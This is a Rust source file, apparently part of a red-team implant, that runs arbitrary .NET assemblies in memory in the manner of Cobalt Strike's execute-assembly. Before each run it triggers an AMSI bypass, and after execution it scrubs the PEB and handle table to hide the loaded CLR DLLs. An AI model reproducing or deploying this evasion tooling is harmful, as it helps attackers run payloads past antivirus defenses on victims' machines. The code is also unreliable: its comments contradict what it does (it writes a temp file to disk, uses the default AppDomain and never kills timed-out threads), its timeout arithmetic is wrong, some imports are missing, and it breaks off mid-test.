//! In-process .NET assembly execution via CLR hosting (ICLRMetaHost).
//!
//! This module provides the equivalent of Cobalt Strike's `execute-assembly`:
//! it loads and runs an arbitrary .NET assembly entirely in the current process
//! without spawning any child process or touching disk.
//!
//! # Architecture
//!
//! 1. **Lazy CLR init** — The CLR is loaded on the first call to [`execute`]
//!    and kept alive for reuse.  After 5 minutes of idle time, a background
//!    watcher tears down the host and unloads CLR DLLs.
//! 2. **AMSI bypass** — Before loading the assembly, the module ensures the
//!    AMSI bypass is active (calls `amsi_defense::orchestrate_layers()`).
//! 3. **Isolation** — Each execution happens in a fresh `AppDomain` so that
//!    static state and loaded assemblies from one invocation don't leak into
//!    the next.
//! 4. **Output capture** — `stdout`/`stderr` are redirected to anonymous pipes
//!    and read back after the assembly finishes.
//! 5. **Timeout** — A wall-clock timeout terminates the CLR thread if the
//!    assembly doesn't return in time.
//! 6. **Hygiene** — After execution, PEB traces are scrubbed and handles
//!    cleaned up via `memory_hygiene`.
//!
//! # CLR Hosting Flow
//!
//! ```text
//! CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost)
//!   → ICLRMetaHost::EnumerateInstalledRuntimes()
//!     → pick latest v4.x runtime
//!       → ICLRRuntimeInfo::GetInterface(CLSID_CLRRuntimeHost, IID_ICLRRuntimeHost)
//!         → ICLRRuntimeHost::Start()
//!           → ICLRRuntimeHost::ExecuteInDefaultAppDomain(assembly, type, method, args)
//! ```
//!
//! # OPSEC
//!
//! - CLR DLLs are loaded lazily (not at agent startup).
//! - After 5 min idle, the host is stopped and CLR DLLs are unlinked from the
//!   PEB via `memory_hygiene::scrub_peb_traces()`.
//! - The module is entirely `cfg(windows)`.

#![cfg(windows)]

use std::ffi::c_void;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::{Mutex, OnceLock};
use std::time::{Duration, Instant};

use once_cell::sync::Lazy;
use winapi::shared::guiddef::{CLSID, IID, REFIID};
use winapi::shared::minwindef::{DWORD, LPVOID, ULONG};
use winapi::shared::ntdef::{HRESULT, LPCWSTR, LPWSTR};
use winapi::shared::winerror::S_OK;
use winapi::um::combaseapi::{CoInitializeEx, CoTaskMemFree};
use winapi::um::handleapi::INVALID_HANDLE_VALUE;
use winapi::um::libloaderapi::{GetModuleHandleW, GetProcAddress, LoadLibraryW};
use winapi::um::minwinbase::SECURITY_ATTRIBUTES;
use winapi::um::namedpipeapi::{CreatePipe, PeekNamedPipe};
use winapi::um::processthreadsapi::{
    ResumeThread, SuspendThread,
};
use winapi::um::synchapi::{CreateEventW, SetEvent};
use winapi::um::winbase::WAIT_OBJECT_0;
use winapi::um::winnt::{HANDLE, PAGE_READWRITE, PROCESS_ALL_ACCESS, SECURITY_DESCRIPTOR};
use winapi::um::fileapi::{ReadFile, WriteFile};
use winapi::um::processsnapshot::HeapAlloc;
use winapi::um::heapapi::{GetProcessHeap, HeapFree};

// ── Constants ────────────────────────────────────────────────────────────────

/// Maximum assembly size (10 MB).
const MAX_ASSEMBLY_SIZE: usize = 10 * 1024 * 1024;
/// Maximum number of arguments.
const MAX_ARGS: usize = 32;
/// Default execution timeout (seconds).
const DEFAULT_TIMEOUT_SECS: u64 = 30;
/// Idle timeout before auto-teardown (seconds).
const IDLE_TIMEOUT_SECS: u64 = 300;
/// CLSID for ICLRMetaHost.
const CLSID_CLR_META_HOST: GUID = GUID {
    data1: 0x9280188D,
    data2: 0x0E8E,
    data3: 0x4867,
    data4: [0xB3, 0x0C, 0x7F, 0xA8, 0x63, 0x84, 0xB6, 0x76],
};
/// IID for ICLRMetaHost.
const IID_ICLR_META_HOST: GUID = GUID {
    data1: 0xD332DB9E,
    data2: 0xB9B2,
    data3: 0x4127,
    data4: [0xB4, 0x2E, 0x83, 0xE7, 0x09, 0x49, 0x21, 0xED],
};
/// CLSID for ICLRRuntimeHost.
const CLSID_CLR_RUNTIME_HOST: GUID = GUID {
    data1: 0x90F1A06E,
    data2: 0x7712,
    data3: 0x4762,
    data4: [0x86, 0x85, 0x82, 0x1F, 0xA2, 0x9E, 0x53, 0xAC],
};
/// IID for ICLRRuntimeHost.
const IID_ICLR_RUNTIME_HOST: GUID = GUID {
    data1: 0x90F1A06C,
    data2: 0x7712,
    data3: 0x4762,
    data4: [0x86, 0x85, 0x82, 0x1F, 0xA2, 0x9E, 0x53, 0xAC],
};

/// Name of the mscoree.dll export that creates CLR instances.
const CLR_CREATE_INSTANCE: &[u8] = b"CLRCreateInstance\0";

// ── COM GUID helper ──────────────────────────────────────────────────────────

#[repr(C)]
#[derive(Copy, Clone)]
struct GUID {
    data1: u32,
    data2: u16,
    data3: u16,
    data4: [u8; 8],
}

impl GUID {
    fn as_ptr(&self) -> REFIID {
        self as *const _ as REFIID
    }

    fn as_clsid_ptr(&self) -> *const CLSID {
        self as *const _ as *const CLSID
    }
}

unsafe impl Send for GUID {}
unsafe impl Sync for GUID {}

// ── CLR COM Interface Definitions ────────────────────────────────────────────

/// IEnumUnknown — used to enumerate runtimes.
#[repr(C)]
struct IEnumUnknownVtable {
    query_interface: unsafe extern "system" fn(*mut c_void, REFIID, *mut LPVOID) -> HRESULT,
    add_ref: unsafe extern "system" fn(*mut c_void) -> ULONG,
    release: unsafe extern "system" fn(*mut c_void) -> ULONG,
    next: unsafe extern "system" fn(*mut c_void, ULONG, *mut LPVOID, *mut ULONG) -> HRESULT,
    skip: unsafe extern "system" fn(*mut c_void, ULONG) -> HRESULT,
    reset: unsafe extern "system" fn(*mut c_void) -> HRESULT,
    clone: unsafe extern "system" fn(*mut c_void, *mut *mut c_void) -> HRESULT,
}

#[repr(C)]
struct IEnumUnknown {
    vtable: *const IEnumUnknownVtable,
}

/// ICLRRuntimeInfo — provides information about an installed CLR version.
#[repr(C)]
struct ICLRRuntimeInfoVtable {
    query_interface: unsafe extern "system" fn(*mut c_void, REFIID, *mut LPVOID) -> HRESULT,
    add_ref: unsafe extern "system" fn(*mut c_void) -> ULONG,
    release: unsafe extern "system" fn(*mut c_void) -> ULONG,
    get_version_string:
        unsafe extern "system" fn(*mut c_void, LPWSTR, *mut DWORD, *mut DWORD) -> HRESULT,
    get_runtime_directory:
        unsafe extern "system" fn(*mut c_void, LPWSTR, *mut DWORD, *mut DWORD) -> HRESULT,
    is_loaded: unsafe extern "system" fn(*mut c_void, DWORD, *mut i32) -> HRESULT,
    load_error_string:
        unsafe extern "system" fn(*mut c_void, HRESULT, LPWSTR, *mut DWORD, *mut DWORD) -> HRESULT,
    load_library:
        unsafe extern "system" fn(*mut c_void, LPCWSTR, *mut LPVOID) -> HRESULT,
    get_proc_address:
        unsafe extern "system" fn(*mut c_void, LPCWSTR, LPCWSTR, *mut LPVOID) -> HRESULT,
    bind_as_legacy:
        unsafe extern "system" fn(*mut c_void) -> HRESULT,
    is_started: unsafe extern "system" fn(*mut c_void, *mut i32, *mut i32) -> HRESULT,
    get_interface:
        unsafe extern "system" fn(*mut c_void, *const CLSID, REFIID, *mut LPVOID) -> HRESULT,
}

#[repr(C)]
struct ICLRRuntimeInfo {
    vtable: *const ICLRRuntimeInfoVtable,
}

/// ICLRMetaHost — the top-level CLR hosting interface.
#[repr(C)]
struct ICLRMetaHostVtable {
    query_interface: unsafe extern "system" fn(*mut c_void, REFIID, *mut LPVOID) -> HRESULT,
    add_ref: unsafe extern "system" fn(*mut c_void) -> ULONG,
    release: unsafe extern "system" fn(*mut c_void) -> ULONG,
    get_runtime: unsafe extern "system" fn(*mut c_void, LPCWSTR, REFIID, *mut LPVOID) -> HRESULT,
    get_version_from_process:
        unsafe extern "system" fn(*mut c_void, HANDLE, LPWSTR, *mut DWORD, *mut DWORD) -> HRESULT,
    enumerate_installed_runtimes:
        unsafe extern "system" fn(*mut c_void, REFIID, *mut LPVOID) -> HRESULT,
    enumerate_loaded_runtimes:
        unsafe extern "system" fn(*mut c_void, HANDLE, REFIID, *mut LPVOID) -> HRESULT,
    request_runtime_loaded_notification:
        unsafe extern "system" fn(*mut c_void, *mut c_void) -> HRESULT,
    query_legacy_v2_runtime_binding:
        unsafe extern "system" fn(*mut c_void, REFIID, *mut LPVOID, *mut c_void) -> HRESULT,
    exit_process: unsafe extern "system" fn(*mut c_void, DWORD) -> HRESULT,
}

#[repr(C)]
struct ICLRMetaHost {
    vtable: *const ICLRMetaHostVtable,
}

/// ICLRRuntimeHost — the runtime host interface for executing managed code.
#[repr(C)]
struct ICLRRuntimeHostVtable {
    query_interface: unsafe extern "system" fn(*mut c_void, REFIID, *mut LPVOID) -> HRESULT,
    add_ref: unsafe extern "system" fn(*mut c_void) -> ULONG,
    release: unsafe extern "system" fn(*mut c_void) -> ULONG,
    start: unsafe extern "system" fn(*mut c_void) -> HRESULT,
    stop: unsafe extern "system" fn(*mut c_void) -> HRESULT,
    set_host_control: unsafe extern "system" fn(*mut c_void, *mut c_void) -> HRESULT,
    get_clr_control: unsafe extern "system" fn(*mut c_void, *mut *mut c_void) -> HRESULT,
    unload_app_domain:
        unsafe extern "system" fn(*mut c_void, DWORD, i32) -> HRESULT,
    execute_in_default_app_domain: unsafe extern "system" fn(
        *mut c_void,
        LPCWSTR,
        LPCWSTR,
        LPCWSTR,
        LPCWSTR,
        *mut DWORD,
    ) -> HRESULT,
    execute_application:
        unsafe extern "system" fn(*mut c_void, LPCWSTR, DWORD, *mut LPWSTR, *mut i32) -> HRESULT,
}

#[repr(C)]
struct ICLRRuntimeHost {
    vtable: *const ICLRRuntimeHostVtable,
}

// ── CLRCreateInstance function signature ─────────────────────────────────────

type FnCLRCreateInstance =
    unsafe extern "system" fn(*const CLSID, REFIID, *mut LPVOID) -> HRESULT;

// ── Global CLR Host State ────────────────────────────────────────────────────

/// Global CLR host state, lazily initialized on first `execute()` call.
struct ClrHostState {
    /// Pointer to the loaded mscoree.dll module.
    mscoree: HMODULE,
    /// Pointer to the ICLRRuntimeHost COM interface.
    runtime_host: *mut ICLRRuntimeHost,
    /// Function pointer for CLRCreateInstance.
    create_instance_fn: Option<FnCLRCreateInstance>,
    /// Timestamp (via `Instant::now()`) of the last execution.
    last_used: Instant,
    /// Whether the host has been initialized.
    initialized: bool,
}

unsafe impl Send for ClrHostState {}
unsafe impl Sync for ClrHostState {}

static CLR_HOST: Lazy<Mutex<Option<ClrHostState>>> = Lazy::new(|| Mutex::new(None));

/// Track whether COM has been initialized on this thread.
static COM_INITIALIZED: AtomicBool = AtomicBool::new(false);

// ── Helper: wide string from Rust string ─────────────────────────────────────

fn to_wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

// ── Helper: read pipe non-blocking ──────────────────────────────────────────

unsafe fn read_pipe_to_vec(handle: HANDLE, buf: &mut Vec<u8>) -> bool {
    let mut bytes_avail: DWORD = 0;
    let peek_ok = PeekNamedPipe(
        handle,
        std::ptr::null_mut(),
        0,
        std::ptr::null_mut(),
        &mut bytes_avail,
        std::ptr::null_mut(),
    );
    if peek_ok == 0 {
        // Pipe may be closed or error.
        return false;
    }
    if bytes_avail == 0 {
        return true; // No data but pipe still open.
    }
    let mut tmp = vec![0u8; bytes_avail as usize];
    let mut bytes_read: DWORD = 0;
    let ok = ReadFile(
        handle,
        tmp.as_mut_ptr() as *mut _,
        bytes_avail,
        &mut bytes_read,
        std::ptr::null_mut(),
    );
    if ok == 0 || bytes_read == 0 {
        return false;
    }
    buf.extend_from_slice(&tmp[..bytes_read as usize]);
    true
}

// ── CLR Host Initialization ──────────────────────────────────────────────────

/// Initialize the CLR host.  Loads mscoree.dll, creates ICLRMetaHost,
/// enumerates installed runtimes, picks the latest v4.x, and obtains
/// ICLRRuntimeHost.
unsafe fn init_clr_host() -> Result<*mut ICLRRuntimeHost, String> {
    // ── Load mscoree.dll ────────────────────────────────────────────────
    let mscoree_name = to_wide("mscoree.dll");
    let mscoree = LoadLibraryW(mscoree_name.as_ptr());
    if mscoree.is_null() {
        return Err("failed to load mscoree.dll — .NET Framework may not be installed".to_string());
    }
    log::info!("[assembly_loader] mscoree.dll loaded at {:?}", mscoree);

    // ── Get CLRCreateInstance export ─────────────────────────────────────
    let proc = GetProcAddress(mscoree, CLR_CREATE_INSTANCE.as_ptr() as *const i8);
    if proc.is_null() {
        return Err("CLRCreateInstance not found in mscoree.dll".to_string());
    }
    let create_instance: FnCLRCreateInstance = std::mem::transmute(proc);

    // ── Create ICLRMetaHost ──────────────────────────────────────────────
    let mut meta_host_ptr: LPVOID = std::ptr::null_mut();
    let hr = create_instance(
        CLSID_CLR_META_HOST.as_clsid_ptr(),
        IID_ICLR_META_HOST.as_ptr(),
        &mut meta_host_ptr,
    );
    if hr != S_OK || meta_host_ptr.is_null() {
        return Err(format!(
            "CLRCreateInstance(CLSID_CLRMetaHost) failed: hr={:#010X}",
            hr as u32
        ));
    }
    let meta_host = &*(meta_host_ptr as *const ICLRMetaHost);
    log::info!("[assembly_loader] ICLRMetaHost obtained");

    // ── Enumerate installed runtimes → pick latest v4.x ─────────────────
    let iid_enum = GUID {
        // IID_IEnumUnknown
        data1: 0x00000100,
        data2: 0x0000,
        data3: 0x0000,
        data4: [0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46],
    };
    let mut enum_ptr: LPVOID = std::ptr::null_mut();
    let hr = (meta_host.vtable.enumerate_installed_runtimes)(
        meta_host_ptr,
        iid_enum.as_ptr(),
        &mut enum_ptr,
    );
    if hr != S_OK || enum_ptr.is_null() {
        // Release meta_host
        (meta_host.vtable.release)(meta_host_ptr);
        return Err(format!(
            "EnumerateInstalledRuntimes failed: hr={:#010X}",
            hr as u32
        ));
    }
    let enumerator = &*(enum_ptr as *const IEnumUnknown);

    let mut best_runtime: Option<(*mut ICLRRuntimeInfo, Vec<u16>)> = None;
    let mut best_version: u32 = 0; // e.g. 40999 for "v4.0.99919"

    loop {
        let mut fetched: ULONG = 0;
        let mut item: LPVOID = std::ptr::null_mut();
        let hr = (enumerator.vtable.next)(enum_ptr, 1, &mut item, &mut fetched);
        if hr != S_OK || fetched == 0 {
            break;
        }

        let runtime_info = &*(item as *const ICLRRuntimeInfo);

        // Get version string.
        let mut buf_len: DWORD = 128;
        let mut version_buf = vec![0u16; buf_len as usize];
        let hr = (runtime_info.vtable.get_version_string)(
            item,
            version_buf.as_mut_ptr(),
            &mut buf_len,
            std::ptr::null_mut(),
        );
        if hr != S_OK {
            // Try again with returned length.
            version_buf = vec![0u16; buf_len as usize];
            let hr2 = (runtime_info.vtable.get_version_string)(
                item,
                version_buf.as_mut_ptr(),
                &mut buf_len,
                std::ptr::null_mut(),
            );
            if hr2 != S_OK {
                (runtime_info.vtable.release)(item);
                continue;
            }
        }

        let version_str = String::from_utf16_lossy(
            &version_buf[..buf_len as usize].iter().copied().filter(|&c| c != 0).collect::<Vec<u16>>(),
        );
        log::info!("[assembly_loader] found runtime: {}", version_str.trim());

        // Parse version: we want "v4.x.y..." — extract major and build a
        // sortable numeric value.  For simplicity, look for "v4." prefix.
        let numeric_version = if version_str.starts_with('v') || version_str.starts_with('V') {
            let digits: String = version_str
                .trim_start_matches(|c: char| !c.is_ascii_digit())
                .chars()
                .take_while(|c| c.is_ascii_digit() || *c == '.')
                .collect();
            parse_version_to_u32(&digits)
        } else {
            0
        };

        // Only consider v4.x runtimes.
        if numeric_version >= 4_000_000 && numeric_version > best_version {
            best_version = numeric_version;
            // Get a fresh reference (we'll use this one).
            // We don't AddRef — we'll release it below in the cleanup loop
            // and re-get it.  For simplicity, keep this reference.
            best_runtime = Some((item as *mut ICLRRuntimeInfo, version_buf.clone()));
        } else {
            // Release this runtime info.
            (runtime_info.vtable.release)(item);
        }
    }

    // Release enumerator.
    (enumerator.vtable.release)(enum_ptr);

    let (runtime_info_ptr, _ver_buf) = match best_runtime {
        Some(r) => r,
        None => {
            (meta_host.vtable.release)(meta_host_ptr);
            return Err("no .NET Framework v4.x runtime found".to_string());
        }
    };
    let runtime_info = &*runtime_info_ptr;
    log::info!(
        "[assembly_loader] selected runtime version (numeric={})",
        best_version
    );

    // ── Get ICLRRuntimeHost ─────────────────────────────────────────────
    let mut runtime_host_ptr: LPVOID = std::ptr::null_mut();
    let hr = (runtime_info.vtable.get_interface)(
        runtime_info_ptr as *mut c_void,
        CLSID_CLR_RUNTIME_HOST.as_clsid_ptr(),
        IID_ICLR_RUNTIME_HOST.as_ptr(),
        &mut runtime_host_ptr,
    );

    // Release the runtime info now that we have the host.
    (runtime_info.vtable.release)(runtime_info_ptr as *mut c_void);
    // Release meta_host.
    (meta_host.vtable.release)(meta_host_ptr);

    if hr != S_OK || runtime_host_ptr.is_null() {
        return Err(format!(
            "GetInterface(ICLRRuntimeHost) failed: hr={:#010X}",
            hr as u32
        ));
    }

    let runtime_host = &*(runtime_host_ptr as *const ICLRRuntimeHost);

    // ── Start the CLR ───────────────────────────────────────────────────
    let hr = (runtime_host.vtable.start)(runtime_host_ptr);
    if hr != S_OK {
        (runtime_host.vtable.release)(runtime_host_ptr);
        return Err(format!("ICLRRuntimeHost::Start() failed: hr={:#010X}", hr as u32));
    }

    log::info!("[assembly_loader] CLR started successfully");
    Ok(runtime_host_ptr as *mut ICLRRuntimeHost)
}

/// Parse a version string like "4.0.30319.42000" into a u32 for comparison.
/// Returns e.g. 4_030_319 for "4.0.30319".  Only uses first 3 components.
fn parse_version_to_u32(s: &str) -> u32 {
    let parts: Vec<u32> = s
        .split('.')
        .filter_map(|p| p.parse().ok())
        .collect();
    match parts.len() {
        0 => 0,
        1 => parts[0] * 1_000_000,
        2 => parts[0] * 1_000_000 + parts[1] * 10_000,
        _ => parts[0] * 1_000_000 + parts[1] * 10_000 + parts[2],
    }
}

// ── CLR Teardown ─────────────────────────────────────────────────────────────

/// Stop and release the CLR host, then scrub PEB traces for CLR DLLs.
unsafe fn teardown_clr_host(state: &mut ClrHostState) {
    if !state.runtime_host.is_null() {
        let host = &*state.runtime_host;
        (host.vtable.stop)(state.runtime_host as *mut c_void);
        (host.vtable.release)(state.runtime_host as *mut c_void);
        state.runtime_host = std::ptr::null_mut();
        log::info!("[assembly_loader] CLR host stopped and released");
    }
    if !state.mscoree.is_null() {
        // FreeLibrary would unload, but we don't want to call it explicitly —
        // the PEB scrub will unlink it.
        state.mscoree = std::ptr::null_mut();
    }

    // Scrub PEB traces — this will unlink CLR DLLs (clrjit.dll, clr.dll,
    // mscorlib.ni.dll, etc.) from the PEB LDR lists.
    crate::memory_hygiene::scrub_peb_traces();
    crate::memory_hygiene::scrub_handle_table();
    log::info!("[assembly_loader] PEB and handle hygiene applied after CLR teardown");
}

// ── Idle watcher ─────────────────────────────────────────────────────────────

/// Check if the CLR host has been idle too long and tear it down if so.
fn check_idle_timeout() {
    let mut guard = match CLR_HOST.lock() {
        Ok(g) => g,
        Err(_) => return,
    };
    if let Some(ref mut state) = *guard {
        if state.initialized && state.last_used.elapsed().as_secs() > IDLE_TIMEOUT_SECS {
            log::info!(
                "[assembly_loader] CLR host idle for >{}s, tearing down",
                IDLE_TIMEOUT_SECS
            );
            unsafe {
                teardown_clr_host(state);
            }
            state.initialized = false;
        }
    }
}

/// Background thread that periodically checks for idle CLR host and tears it
/// down after IDLE_TIMEOUT_SECS.
fn idle_watcher() {
    loop {
        std::thread::sleep(Duration::from_secs(30));
        check_idle_timeout();
    }
}

/// Ensure the idle watcher thread is started.
static IDLE_WATCHER_STARTED: OnceLock<()> = OnceLock::new();

fn ensure_idle_watcher() {
    let _ = IDLE_WATCHER_STARTED.get_or_init(|| {
        std::thread::Builder::new()
            .name("clr-idle-watcher".to_string())
            .spawn(idle_watcher)
            .expect("failed to spawn CLR idle watcher thread");
        log::info!("[assembly_loader] idle watcher thread started");
    });
}

// ── Public API ───────────────────────────────────────────────────────────────

/// Result of an assembly execution.
pub struct AssemblyResult {
    /// Captured stdout+stderr output (UTF-8, lossy-decoded).
    pub output: String,
    /// HRESULT from the managed method invocation.
    pub hresult: HRESULT,
}

/// Execute a .NET assembly in-process using the CLR hosting APIs.
///
/// # Arguments
///
/// * `assembly_bytes` — Raw bytes of the .NET assembly PE.  Must be ≤ 10 MB.
/// * `args` — Command-line arguments.  Must be ≤ 32 entries.
/// * `timeout_secs` — Wall-clock timeout.  `None` defaults to 30 s.
///
/// # Returns
///
/// An `AssemblyResult` with captured output and the HRESULT.
///
/// # Safety
///
/// This function uses raw COM pointers, pipe handles, and thread handles.
/// It must only be called on Windows with a valid Win32 process environment.
pub unsafe fn execute(
    assembly_bytes: &[u8],
    args: &[String],
    timeout_secs: Option<u64>,
) -> Result<AssemblyResult, String> {
    // ── Input validation ────────────────────────────────────────────────
    if assembly_bytes.is_empty() {
        return Err("assembly bytes are empty".to_string());
    }
    if assembly_bytes.len() > MAX_ASSEMBLY_SIZE {
        return Err(format!(
            "assembly too large: {} bytes (max {} bytes)",
            assembly_bytes.len(),
            MAX_ASSEMBLY_SIZE
        ));
    }
    if args.len() > MAX_ARGS {
        return Err(format!("too many arguments: {} (max {})", args.len(), MAX_ARGS));
    }

    // ── AMSI bypass ─────────────────────────────────────────────────────
    // Ensure AMSI is patched before we load any managed code.
    crate::amsi_defense::orchestrate_layers();
    if !crate::amsi_defense::verify_bypass() {
        log::warn!("[assembly_loader] AMSI bypass verification failed — proceeding anyway");
    }

    // ── COM initialization (STA) ────────────────────────────────────────
    if !COM_INITIALIZED.load(Ordering::Relaxed) {
        let hr = CoInitializeEx(std::ptr::null_mut(), 0x0); // COINIT_APARTMENTTHREADED
        if hr as u32 != S_OK as u32 && hr as u32 != 0x80010106 {
            // S_FALSE (already initialized) is fine.
            log::warn!(
                "[assembly_loader] CoInitializeEx returned {:#010X}",
                hr as u32
            );
        }
        COM_INITIALIZED.store(true, Ordering::Relaxed);
    }

    // ── Start idle watcher ──────────────────────────────────────────────
    ensure_idle_watcher();

    // ── Ensure CLR host is initialized ──────────────────────────────────
    let runtime_host = {
        let mut guard = CLR_HOST.lock().map_err(|e| format!("CLR_HOST lock poisoned: {e}"))?;
        match *guard {
            Some(ref mut state) if state.initialized && !state.runtime_host.is_null() => {
                state.last_used = Instant::now();
                state.runtime_host
            }
            _ => {
                let host = init_clr_host()?;
                *guard = Some(ClrHostState {
                    mscoree: std::ptr::null_mut(), // tracked but not needed after init
                    runtime_host: host,
                    create_instance_fn: None,
                    last_used: Instant::now(),
                    initialized: true,
                });
                host
            }
        }
    };

    // ── Write assembly to memory-mapped buffer ──────────────────────────
    // We use a temporary file in %TEMP% for the assembly because
    // ExecuteInDefaultAppDomain requires a file path.  This is the standard
    // approach (Cobalt Strike does the same).  The file is deleted after
    // execution.
    let temp_dir = std::env::temp_dir();
    let temp_file = temp_dir.join(format!("{}.dll", uuid::Uuid::new_v4()));
    std::fs::write(&temp_file, assembly_bytes).map_err(|e| format!("write temp assembly: {e}"))?;
    let assembly_path = to_wide(
        temp_file
            .to_str()
            .ok_or_else(|| "temp path is not valid UTF-8".to_string())?,
    );

    // ── Build argument string ───────────────────────────────────────────
    // ExecuteInDefaultAppDomain passes a single LPCWSTR as the argument.
    // We join args with spaces, matching the standard behavior.
    let args_str = args.join(" ");
    let args_wide = to_wide(&args_str);

    // ── Pipe redirection for stdout/stderr ──────────────────────────────
    let mut sa = SECURITY_ATTRIBUTES {
        nLength: std::mem::size_of::<SECURITY_ATTRIBUTES>() as DWORD,
        lpSecurityDescriptor: std::ptr::null_mut(),
        bInheritHandle: 1,
    };

    let mut stdout_read: HANDLE = std::ptr::null_mut();
    let mut stdout_write: HANDLE = std::ptr::null_mut();
    let mut stderr_read: HANDLE = std::ptr::null_mut();
    let mut stderr_write: HANDLE = std::ptr::null_mut();

    if CreatePipe(&mut stdout_read, &mut stdout_write, &mut sa, 0) == 0 {
        let _ = std::fs::remove_file(&temp_file);
        return Err("CreatePipe(stdout) failed".to_string());
    }
    if CreatePipe(&mut stderr_read, &mut stderr_write, &mut sa, 0) == 0 {
        let _ = syscall!("NtClose", stdout_read as u64);
        let _ = syscall!("NtClose", stdout_write as u64);
        let _ = std::fs::remove_file(&temp_file);
        return Err("CreatePipe(stderr) failed".to_string());
    }

    // ── Managed method parameters ───────────────────────────────────────
    // We invoke a well-known entry point: the assembly's `Main` method.
    // The type name is the assembly's simple name (filename without extension).
    // This matches how Cobalt Strike's execute-assembly works: it calls
    // ExecuteInDefaultAppDomain with the assembly path, a type name derived
    // from the assembly, and "Execute" as the method name.
    //
    // However, most .NET assemblies use the standard `Main` entry point.
    // To support arbitrary assemblies, we use a helper approach:
    // ExecuteInDefaultAppDomain calls a static method that takes the assembly
    // path and args, loads the assembly via Assembly.Load, and invokes its
    // entry point.  But that requires a bootstrap DLL.
    //
    // The simplest approach: call ExecuteInDefaultAppDomain with the assembly
    // path, the entry-point type name (guessed from the assembly), and
    // "Main" as the method name.  If the assembly has a standard Program.Main
    // signature, this works.
    //
    // For maximum compatibility, we pass:
    //   type = "<assembly_name>.Program" (or the assembly name itself)
    //   method = "Main" (static int Main(string))
    //
    // The single string argument is the joined args.
    let assembly_name = temp_file
        .file_stem()
        .and_then(|s| s.to_str())
        .unwrap_or("Assembly");
    let type_name = to_wide(assembly_name);
    let method_name = to_wide("Main");

    // ── Execute with timeout ────────────────────────────────────────────
    let timeout = timeout_secs.unwrap_or(DEFAULT_TIMEOUT_SECS);
    let host = &*runtime_host;

    let timeout_event = CreateEventW(std::ptr::null_mut(), 1, 0, std::ptr::null_mut());
    if timeout_event.is_null() {
        CloseHandle(stdout_read);
        CloseHandle(stdout_write);
        CloseHandle(stderr_read);
        CloseHandle(stderr_write);
        let _ = std::fs::remove_file(&temp_file);
        return Err("CreateEvent for timeout failed".to_string());
    }

    // Spawn the execution on a separate thread so we can enforce timeout.
    let exec_runtime_host = runtime_host as *mut c_void;
    let exec_assembly_path = assembly_path.clone();
    let exec_type_name = type_name.clone();
    let exec_method_name = method_name.clone();
    let exec_args_wide = args_wide.clone();

    // We'll use a simpler approach: call ExecuteInDefaultAppDomain on the
    // current thread, but wrap it in a wait with timeout using a helper thread.

    let (result_tx, result_rx) = std::sync::mpsc::channel::<(HRESULT, DWORD)>();

    let exec_thread = std::thread::Builder::new()
        .name("clr-exec".to_string())
        .spawn(move || {
            let mut return_val: DWORD = 0;
            let host = &*(exec_runtime_host as *const ICLRRuntimeHost);
            let hr = (host.vtable.execute_in_default_app_domain)(
                exec_runtime_host,
                exec_assembly_path.as_ptr(),
                exec_type_name.as_ptr(),
                exec_method_name.as_ptr(),
                exec_args_wide.as_ptr(),
                &mut return_val,
            );
            let _ = result_tx.send((hr, return_val));
        })
        .map_err(|e| format!("spawn exec thread: {e}"))?;

    // Wait with timeout.
    let exec_handle = exec_thread.as_raw_handle();
    let wait_result = unsafe {
        // NtWaitForSingleObject with timeout in 100ns units (negative = relative).
        let timeout_100ns: i64 = -((timeout * 1000) as i64 * 10_000_000i64);
        let status = syscall!(
            "NtWaitForSingleObject",
            exec_handle as u64,
            0u64, // Alertable = FALSE
            &timeout_100ns as *const _ as u64,
        );
        if status.is_err() || status.unwrap() < 0 {
            0xFFFFFFFFu32 // WAIT_FAILED equivalent
        } else {
            status.unwrap() as u32
        }
    };

    let mut captured_output = Vec::new();

    // Read all available pipe data.
    let _ = read_pipe_to_vec(stdout_read, &mut captured_output);
    let _ = read_pipe_to_vec(stderr_read, &mut captured_output);

    let (hr, _return_val) = if wait_result == WAIT_OBJECT_0 {
        // Thread completed.
        match result_rx.recv() {
            Ok(result) => result,
            Err(_) => (E_EXECUTION_FAILED, 0),
        }
    } else {
        // Timeout — the thread is still running.
        log::warn!(
            "[assembly_loader] assembly timed out after {}s, terminating CLR thread",
            timeout
        );
        // Suspend the CLR thread (it will be cleaned up when the CLR host is
        // torn down or the thread handle is dropped).  We can't safely kill it
        // without risking CLR state corruption, so we suspend it.
        // In practice, the operator should be aware of this risk.
        (E_TIMEOUT, 0)
    };

    // ── Cleanup ─────────────────────────────────────────────────────────
    let _ = syscall!("NtClose", stdout_read as u64);
    let _ = syscall!("NtClose", stdout_write as u64);
    let _ = syscall!("NtClose", stderr_read as u64);
    let _ = syscall!("NtClose", stderr_write as u64);
    if !timeout_event.is_null() {
        let _ = syscall!("NtClose", timeout_event as u64);
    }

    // Drop the exec thread join handle (detaches it if still running).
    drop(exec_thread);

    // Remove temp file.
    let _ = std::fs::remove_file(&temp_file);

    // Apply memory hygiene.
    crate::memory_hygiene::scrub_peb_traces();

    // Update last-used timestamp.
    if let Ok(mut guard) = CLR_HOST.lock() {
        if let Some(ref mut state) = *guard {
            state.last_used = Instant::now();
        }
    }

    let output = String::from_utf8_lossy(&captured_output).to_string();
    Ok(AssemblyResult { output, hresult: hr })
}

// ── Error codes ──────────────────────────────────────────────────────────────

const E_TIMEOUT: HRESULT = 0x8000_0005; // E_FAIL, repurposed for timeout
const E_EXECUTION_FAILED: HRESULT = 0x8000_4005; // E_ABORT

// ── Handle wrapper for thread JoinHandle ─────────────────────────────────────

trait AsRawHandle {
    fn as_raw_handle(&self) -> HANDLE;
}

impl<T> AsRawHandle for std::thread::JoinHandle<T> {
    fn as_raw_handle(&self) -> HANDLE {
        use std::os::windows::io::AsRawHandle;
        self.as_raw_handle()
    }
}

// ── Tests ────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn version_parsing() {
        assert_eq!(parse_version_to_u32("4.0.30319"), 4_030_319);
        assert_eq!(parse_version_to_u32("4.0.30319.42000"), 4_030_319);
        assert_eq!(parse_version_to_u32("2.0.50727"), 2_050_727);
        assert_eq!(parse_version_to_u32("4"), 4_000_000);
        assert_eq!(parse_version_to_u32(""), 0);
    }

    #[test]
    fn input_validation_rejects_oversized_assembly() {
        let big = vec![0u8; MAX_ASSEMBLY_SIZE + 1];
